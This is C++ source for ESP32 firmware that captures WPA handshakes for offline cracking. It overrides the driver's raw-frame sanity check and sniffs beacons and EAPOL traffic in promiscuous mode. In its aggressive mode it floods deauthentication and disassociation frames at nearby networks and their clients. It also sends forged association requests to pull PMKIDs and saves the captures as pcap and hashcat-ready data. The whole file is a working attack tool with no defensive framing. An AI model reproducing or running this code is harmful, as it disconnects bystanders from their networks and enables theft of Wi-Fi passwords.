// cap/sniffer.cpp
// Catch path aligned with 0N3P0rK: lock on EAPOL, bidir kick, PMKID assoc,
// probe-resp ESSID, WDS/0x888E scan. Files still go to LittleFS.

#include "sniffer.h"
#include "pcap.h"
#include "hc22000.h"
#include "../storage/littlefs_ops.h"
#include "../net/ap_sta.h"
#include <esp_wifi.h>
#include <WiFi.h>
#include <LittleFS.h>
#include <string.h>
#include <stdio.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

namespace Cap {

static const uint16_t FRAME_MAX = 512;
static const uint16_t BEACON_MAX = 400;
static const uint8_t  RING_SLOTS = 12;
static const uint32_t MAX_FILE_SIZE = 50 * 1024;
static const uint16_t MAX_FILES = 200;
static const uint8_t HOP_CHANNELS[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t HOP_COUNT = sizeof(HOP_CHANNELS);
static const uint32_t HOP_INTERVAL_MS = 350;
static const uint16_t LOCK_MS = 8000;
static const int8_t MIN_RSSI = -92;
static const uint8_t KICK_BURST = 2;

struct Slot {
    uint8_t  bssid[6];
    uint8_t  station[6];
    uint16_t len;
    uint32_t ts;
    uint8_t  frame[FRAME_MAX];
};

static Slot s_ring[RING_SLOTS];
static volatile uint8_t s_write = 0;
static volatile uint8_t s_read  = 0;

static File     s_file;
static uint8_t  s_fileBssid[6];
static bool     s_fileOpen = false;
static uint32_t s_fileSize = 0;
static char     s_fileName[Storage::FILE_NAME_MAX];
static const char* const PREFIX = "/handshakes/";

static const uint8_t BEACON_SLOTS = 16;
struct BeaconSlot {
    uint8_t  bssid[6];
    uint8_t  channel;
    int8_t   rssi;
    uint16_t len;
    char     ssid[33];
    uint8_t  clients[4][6];
    uint8_t  clientN;
    uint8_t  frame[BEACON_MAX];
};
static BeaconSlot s_beacons[BEACON_SLOTS];
static uint8_t s_beaconCount = 0;
static uint8_t s_beaconClock = 0;

static Counters s_cnt = {};
static volatile bool s_running = false;
static RunMode  s_mode = RunMode::Off;
static bool     s_hopEnabled = false;
static bool     s_deauthEnabled = false;
static uint8_t  s_channelIdx = 0;
static uint32_t s_lastHopMs = 0;
static uint32_t s_lockUntil = 0;
static uint8_t  s_apMac[6] = {};
static uint8_t  s_staMac[6] = {};
static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint8_t  s_kickSta[6] = {};
static uint8_t  s_kickBssid[6] = {};
static bool     s_kickStaOk = false;
static uint8_t  s_probeIdx = 0;
static uint32_t s_lastProbeMs = 0;

static void ssidFromMgmt(const uint8_t* f, uint16_t len, char out[33]) {
    out[0] = '\0';
    if (!f || len < 38) return;
    uint16_t off = 24 + 12;
    while (off + 2 <= len) {
        uint8_t id = f[off];
        uint8_t l = f[off + 1];
        if (off + 2 + l > len) break;
        if (id == 0 && l > 0 && l <= 32) {
            memcpy(out, f + off + 2, l);
            out[l] = '\0';
            return;
        }
        off = (uint16_t)(off + 2 + l);
    }
}

static BeaconSlot* findBeacon(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
    }
    return nullptr;
}

static void noteClient(const uint8_t* bssid, const uint8_t* sta) {
    if (!bssid || !sta) return;
    if (sta[0] & 0x01) return;
    BeaconSlot* b = findBeacon(bssid);
    if (!b) return;
    for (uint8_t i = 0; i < b->clientN; i++) {
        if (memcmp(b->clients[i], sta, 6) == 0) return;
    }
    if (b->clientN < 4) {
        memcpy(b->clients[b->clientN], sta, 6);
        b->clientN++;
        return;
    }
    memcpy(b->clients[s_beaconClock % 4], sta, 6);
}

static bool hopLocked() {
    if (s_lockUntil != 0 && millis() < s_lockUntil) return true;
    if (Hc22000::shouldPauseDeauth()) return true;
    return false;
}

static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, int8_t rssi) {
    if (!bssid || !f || len < 24) return;
    if (len > BEACON_MAX) len = BEACON_MAX;
    char ssid[33];
    ssidFromMgmt(f, len, ssid);
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
            memcpy(s_beacons[i].frame, f, len);
            s_beacons[i].len = len;
            s_beacons[i].channel = s_cnt.currentChannel;
            s_beacons[i].rssi = rssi;
            bool learned = ssid[0] && !s_beacons[i].ssid[0];
            if (ssid[0]) strncpy(s_beacons[i].ssid, ssid, sizeof(s_beacons[i].ssid) - 1);
            if (learned) Hc22000::feed(f, len);
            return;
        }
    }
    uint8_t idx;
    if (s_beaconCount < BEACON_SLOTS) {
        idx = s_beaconCount++;
    } else {
        idx = s_beaconClock++ % BEACON_SLOTS;
    }
    memset(&s_beacons[idx], 0, sizeof(s_beacons[idx]));
    memcpy(s_beacons[idx].bssid, bssid, 6);
    memcpy(s_beacons[idx].frame, f, len);
    s_beacons[idx].len = len;
    s_beacons[idx].channel = s_cnt.currentChannel;
    s_beacons[idx].rssi = rssi;
    if (ssid[0]) strncpy(s_beacons[idx].ssid, ssid, sizeof(s_beacons[idx].ssid) - 1);
    Hc22000::feed(f, len);
}

static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !s_running) return;

    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len > 4) len -= 4;
    if (len < 24) return;

    s_cnt.framesSeen++;
    const uint8_t* f = pkt->payload;

    if (type == WIFI_PKT_MGMT) {
        uint8_t fc = f[0] & 0xFC;
        if (fc == 0x80 || fc == 0x50) {
            storeBeacon(f + 16, f, len, (int8_t)pkt->rx_ctrl.rssi);
        } else if (fc == 0x10) {
            Hc22000::feed(f, len);
        }
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    if ((f[0] & 0x0C) != 0x08) return;

    uint8_t toDs = (f[1] & 0x01) != 0;
    uint8_t fromDs = (f[1] & 0x02) != 0;

    const uint8_t* bssid = nullptr;
    const uint8_t* station = nullptr;
    uint16_t bodyOff = 24;
    if (toDs && !fromDs) {
        bssid   = f + 4;
        station = f + 10;
    } else if (!toDs && fromDs) {
        bssid   = f + 10;
        station = f + 4;
    } else if (toDs && fromDs) {
        bssid   = f + 16;
        station = f + 10;
        bodyOff = 30;
    } else {
        bssid   = f + 16;
        station = f + 10;
    }

    uint8_t subtype = (f[0] >> 4) & 0x0F;
    if (subtype & 0x08) bodyOff += 2;
    if ((subtype & 0x08) && (f[1] & 0x80)) bodyOff += 4;

    if (bssid && station) noteClient(bssid, station);

    bool eapol = false;
    if (bodyOff + 8 <= len &&
        f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA && f[bodyOff + 2] == 0x03 &&
        f[bodyOff + 6] == 0x88 && f[bodyOff + 7] == 0x8E) {
        eapol = true;
    }
    if (!eapol) {
        for (uint16_t i = bodyOff; i + 1 < len; i++) {
            if (f[i] == 0x88 && f[i + 1] == 0x8E) { eapol = true; break; }
        }
    }
    if (!eapol || !bssid) return;

    s_cnt.framesEapol++;
    s_lockUntil = millis() + LOCK_MS;

    uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
    if (next == s_read) {
        s_cnt.framesDropped++;
        return;
    }
    Slot& s = s_ring[s_write];
    memcpy(s.bssid, bssid, 6);
    if (station) memcpy(s.station, station, 6);
    else memset(s.station, 0, 6);
    s.len = (len > FRAME_MAX) ? FRAME_MAX : len;
    s.ts  = millis();
    memcpy(s.frame, f, s.len);
    s_write = next;
    s_cnt.framesQueued++;
}

static void makeFilename(const uint8_t* bssid, uint8_t rot, char out[Storage::FILE_NAME_MAX]) {
    if (rot <= 1) {
        snprintf(out, Storage::FILE_NAME_MAX, "%02X-%02X-%02X-%02X-%02X-%02X.pcap",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    } else {
        snprintf(out, Storage::FILE_NAME_MAX, "%02X-%02X-%02X-%02X-%02X-%02X-%u.pcap",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], (unsigned)rot);
    }
}

static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts) {
    Pcap::PacketHeader ph;
    ph.tsSec   = ts / 1000;
    ph.tsUsec  = (ts % 1000) * 1000;
    ph.inclLen = Pcap::RADIOTAP_LEN + flen;
    ph.origLen = ph.inclLen;
    size_t n = 0;
    n += s_file.write((uint8_t*)&ph, sizeof(ph));
    n += s_file.write(Pcap::RADIOTAP_HEADER, Pcap::RADIOTAP_LEN);
    n += s_file.write(frame, flen);
    size_t expect = sizeof(ph) + Pcap::RADIOTAP_LEN + flen;
    if (n != expect) return false;
    s_fileSize += expect;
    return true;
}

static void closeFile() {
    if (s_fileOpen) {
        s_file.flush();
        s_file.close();
        s_fileOpen = false;
    }
}

static bool openFileForBssid(const uint8_t* bssid) {
    if (s_fileOpen) closeFile();

    Storage::Stats st = Storage::stats();
    bool createdNew = false;

    for (uint8_t rot = 1; rot <= 9; rot++) {
        char name[Storage::FILE_NAME_MAX];
        makeFilename(bssid, rot, name);
        char path[48];
        snprintf(path, sizeof(path), "%s%s", PREFIX, name);

        bool exists = LittleFS.exists(path);
        if (!exists && st.handshakes >= MAX_FILES) {
            Serial.println("[CAP] handshake cap (200 files) reached");
            return false;
        }

        s_file = LittleFS.open(path, "a");
        if (!s_file) return false;

        s_fileSize = s_file.size();
        if (s_fileSize >= MAX_FILE_SIZE) {
            s_file.close();
            continue;
        }

        if (s_fileSize == 0) {
            Pcap::FileHeader fh;
            fh.magic        = 0xA1B2C3D4;
            fh.versionMajor = 2;
            fh.versionMinor = 4;
            fh.thiszone     = 0;
            fh.sigfigs      = 0;
            fh.snaplen      = 65535;
            fh.linktype     = 127;
            if (s_file.write((uint8_t*)&fh, sizeof(fh)) != sizeof(fh)) {
                s_file.close();
                return false;
            }
            s_fileSize = sizeof(fh);
            s_cnt.filesOpened++;
            createdNew = true;
        }

        memcpy(s_fileBssid, bssid, 6);
        memcpy(s_fileName, name, sizeof(s_fileName));
        s_fileOpen = true;

        const BeaconSlot* bcn = findBeacon(bssid);
        if (bcn && (createdNew || s_fileSize < 80)) {
            writePcapPacket(bcn->frame, bcn->len, millis());
            Hc22000::feed(bcn->frame, bcn->len);
            if (bcn->ssid[0]) {
                strncpy(s_cnt.lastHsSsid, bcn->ssid, sizeof(s_cnt.lastHsSsid) - 1);
                s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
            }
        }
        return true;
    }
    return false;
}

static bool sameBssid(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

static void writeFrameToFile(const Slot& s) {
    if (s_fileOpen && !sameBssid(s_fileBssid, s.bssid)) {
        closeFile();
    }
    if (s_fileOpen && s_fileSize >= MAX_FILE_SIZE) {
        closeFile();
    }
    if (!s_fileOpen) {
        if (!openFileForBssid(s.bssid)) return;
    }
    if (!writePcapPacket(s.frame, s.len, s.ts)) {
        s_cnt.framesDropped++;
        closeFile();
        return;
    }
    s_cnt.framesWritten++;
    Hc22000::feed(s.frame, s.len);
    memcpy(s_kickBssid, s.bssid, 6);
    memcpy(s_kickSta, s.station, 6);
    s_kickStaOk = (s.station[0] & 0x01) == 0;
    snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             s.bssid[0], s.bssid[1], s.bssid[2],
             s.bssid[3], s.bssid[4], s.bssid[5]);
    const BeaconSlot* bcn = findBeacon(s.bssid);
    if (bcn && bcn->ssid[0]) {
        strncpy(s_cnt.lastHsSsid, bcn->ssid, sizeof(s_cnt.lastHsSsid) - 1);
        s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
    }
}

static void drainRing() {
    while (s_read != s_write) {
        const Slot& s = s_ring[s_read];
        writeFrameToFile(s);
        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
    }
    if (s_fileOpen) s_file.flush();
}

static bool isOwnAp(const uint8_t* bssid) {
    return memcmp(bssid, s_apMac, 6) == 0;
}

static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
    uint8_t pkt[26] = {
        fc0, 0x00,
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(pkt + 4, dest, 6);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    if (e == ESP_OK) s_cnt.framesDeauth++;
}

static void sendRawSta(uint8_t fc0, const uint8_t* bssid, const uint8_t* sta) {
    uint8_t pkt[26] = {
        fc0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(pkt + 4, bssid, 6);
    memcpy(pkt + 10, sta, 6);
    memcpy(pkt + 16, bssid, 6);
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    if (e == ESP_OK) s_cnt.framesDeauth++;
}

static void sendAuth(const uint8_t* bssid) {
    uint8_t pkt[30] = {
        0xB0, 0x00,
        0x00, 0x00,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0x00, 0x00,
        0x00, 0x00,
        0x01, 0x00,
        0x00, 0x00
    };
    memcpy(pkt + 4, bssid, 6);
    memcpy(pkt + 10, s_staMac, 6);
    memcpy(pkt + 16, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
}

static void sendAssoc(const uint8_t* bssid, const char* ssid) {
    if (!ssid || !ssid[0]) return;
    size_t sl = strlen(ssid);
    if (sl > 32) sl = 32;
    uint8_t pkt[96];
    memset(pkt, 0, sizeof(pkt));
    pkt[0] = 0x00;
    pkt[1] = 0x00;
    memcpy(pkt + 4, bssid, 6);
    memcpy(pkt + 10, s_staMac, 6);
    memcpy(pkt + 16, bssid, 6);
    pkt[24] = 0x31;
    pkt[25] = 0x04;
    pkt[26] = 0x0A;
    pkt[27] = 0x00;
    pkt[28] = 0x00;
    pkt[29] = (uint8_t)sl;
    memcpy(pkt + 30, ssid, sl);
    uint16_t n = (uint16_t)(30 + sl);
    pkt[n++] = 0x01;
    pkt[n++] = 0x08;
    pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
    pkt[n++] = 0x0C; pkt[n++] = 0x12; pkt[n++] = 0x18; pkt[n++] = 0x24;
    pkt[n++] = 0x30;
    pkt[n++] = 0x14;
    pkt[n++] = 0x01; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
    pkt[n++] = 0x01; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
    pkt[n++] = 0x01; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
    pkt[n++] = 0x00; pkt[n++] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, n, false);
}

static void pmkidOnThisChannel() {
    uint32_t now = millis();
    if (now - s_lastProbeMs < 1500) return;
    uint8_t ch = s_cnt.currentChannel;
    uint8_t n = s_beaconCount;
    if (!n) return;
    for (uint8_t k = 0; k < n; k++) {
        s_probeIdx = (uint8_t)((s_probeIdx + 1) % n);
        BeaconSlot& b = s_beacons[s_probeIdx];
        if (b.channel != ch) continue;
        if (isOwnAp(b.bssid)) continue;
        if (b.rssi < MIN_RSSI) continue;
        if (!b.ssid[0]) continue;
        if (Hc22000::hasPair(b.bssid)) continue;
        sendAuth(b.bssid);
        sendAssoc(b.bssid, b.ssid);
        s_lastProbeMs = now;
        return;
    }
}

static void kickOnThisChannel() {
    if (!s_deauthEnabled) return;
    if (hopLocked()) return;
    uint8_t ch = s_cnt.currentChannel;
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        BeaconSlot& b = s_beacons[i];
        if (b.channel != ch) continue;
        if (isOwnAp(b.bssid)) continue;
        if (b.rssi < MIN_RSSI) continue;
        if (Hc22000::hasPair(b.bssid)) continue;

        for (uint8_t r = 0; r < KICK_BURST; r++) {
            sendRawMgmt(0xC0, b.bssid, s_bcast);
            sendRawMgmt(0xA0, b.bssid, s_bcast);
        }
        for (uint8_t c = 0; c < b.clientN; c++) {
            sendRawMgmt(0xC0, b.bssid, b.clients[c]);
            sendRawMgmt(0xA0, b.bssid, b.clients[c]);
            sendRawSta(0xC0, b.bssid, b.clients[c]);
            sendRawSta(0xA0, b.bssid, b.clients[c]);
        }
        if (s_kickStaOk && memcmp(s_kickBssid, b.bssid, 6) == 0) {
            sendRawMgmt(0xC0, b.bssid, s_kickSta);
            sendRawSta(0xC0, b.bssid, s_kickSta);
        }
        yield();
    }
}

void begin() {
    Storage::begin();
    Storage::ensureDir(Storage::DIR_HANDSHAKES);
    s_cnt = {};
    s_write = 0;
    s_read  = 0;
    s_running = false;
    s_mode = RunMode::Off;
    s_beaconCount = 0;
    Hc22000::reset();
}

static void startCommon(RunMode mode) {
    if (!Storage::begin()) return;
    if (s_running) stop();

    s_write = 0;
    s_read = 0;
    s_cnt = {};
    s_cnt.currentBssid[0] = 0;
    s_cnt.lastHsSsid[0] = 0;
    s_lastHopMs = millis();
    s_channelIdx = 0;
    s_lockUntil = 0;
    s_kickStaOk = false;
    s_lastProbeMs = 0;
    s_mode = mode;
    s_hopEnabled = (mode == RunMode::Aggressive);
    s_deauthEnabled = (mode == RunMode::Aggressive);
    s_beaconCount = 0;

    WiFi.setSleep(false);
    WiFi.softAPmacAddress(s_apMac);
    memcpy(s_staMac, s_apMac, 6);
    s_staMac[5] ^= 0x5A;

    if (s_hopEnabled) {
        Net::setApSsidTemporary(Net::AP_SSID_CAP);
    }

    uint8_t ch = 0;
    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&ch, &sec);
    s_cnt.currentChannel = ch ? ch : 1;

    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);
    esp_wifi_set_promiscuous(true);
    s_running = true;

    if (s_hopEnabled) {
        esp_wifi_set_channel(HOP_CHANNELS[0], WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = HOP_CHANNELS[0];
    }

    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u lock=%u\n",
                  mode == RunMode::Aggressive ? "AGGRESSIVE" : "light",
                  (unsigned)s_hopEnabled, (unsigned)s_deauthEnabled,
                  (unsigned)s_cnt.currentChannel, (unsigned)LOCK_MS);
}

void startLight() {
    startCommon(RunMode::Light);
}

void startAggressive() {
    startCommon(RunMode::Aggressive);
}

void stop() {
    if (!s_running && s_mode == RunMode::Off) return;
    bool hopped = s_hopEnabled;
    s_running = false;
    s_deauthEnabled = false;
    s_hopEnabled = false;
    s_mode = RunMode::Off;
    s_lockUntil = 0;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    drainRing();
    closeFile();
    if (hopped) Net::restoreApRadio();
    Serial.printf("[CAP] stopped seen=%u eapol=%u written=%u deauth=%u dropped=%u\n",
                  s_cnt.framesSeen, s_cnt.framesEapol,
                  s_cnt.framesWritten, s_cnt.framesDeauth,
                  s_cnt.framesDropped);
}

bool isRunning() { return s_running; }
RunMode runMode() { return s_mode; }
bool isLocked() { return s_running && hopLocked(); }

const Counters& counters() { return s_cnt; }

void loop() {
    if (!s_running) return;

    drainRing();

    uint32_t now = millis();
    if (hopLocked()) {
        return;
    }
    pmkidOnThisChannel();

    if (!s_hopEnabled) {
        if (now - s_lastHopMs >= 400) {
            s_lastHopMs = now;
        }
        return;
    }
    if (now - s_lastHopMs >= HOP_INTERVAL_MS) {
        s_lastHopMs = now;
        s_channelIdx = (uint8_t)((s_channelIdx + 1) % HOP_COUNT);
        uint8_t ch = HOP_CHANNELS[s_channelIdx];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = ch;
        kickOnThisChannel();
    }
}

} // namespace Cap
